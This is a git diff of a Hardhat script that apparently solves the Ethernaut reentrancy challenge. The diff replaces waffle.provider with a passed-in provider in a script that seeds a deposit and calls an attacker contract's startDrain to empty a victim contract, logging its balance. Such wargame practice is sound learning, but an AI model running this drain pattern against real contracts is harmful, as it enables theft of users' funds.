@@ -1,9 +1,8 @@
-const { ethers , waffle } = require("hardhat");
+const { ethers } = require("hardhat");
 const Runner = require('./lib/runner');
 const Deployer = require('./deployer');
 
-
-Runner.run(async () => {
+Runner.run(async (provider) => {
 	
     //PLACE REENTRANCY CONTRACT ADDRESS HERE (Ethernaut: contract.address)
     const contractAddr = "0x11B9a9a82B84E0B0De4F81294E64B13f3108495a";     
@@ -14,7 +13,7 @@ Runner.run(async () => {
 	
 	console.log();
 	console.log("* * * ");
-	console.log(`target contract balance is ${await waffle.provider.getBalance(victim.address)}`);
+	console.log(`target contract balance is ${await provider.getBalance(victim.address)}`);
     
 	//attacker donates a seed amount just to have a legit balance in the contract
 	//  (the seed amount is the amount that you can withdraw on each iteration of 
@@ -25,6 +24,6 @@ Runner.run(async () => {
 	//attacker begin attack 
 	await attacker.startDrain(victim.address, seedAmount); 
 	
-	console.log(`target contract balance is ${await waffle.provider.getBalance(victim.address)}`);
+	console.log(`target contract balance is ${await provider.getBalance(victim.address)}`);
 	console.log("* * * ");
 });
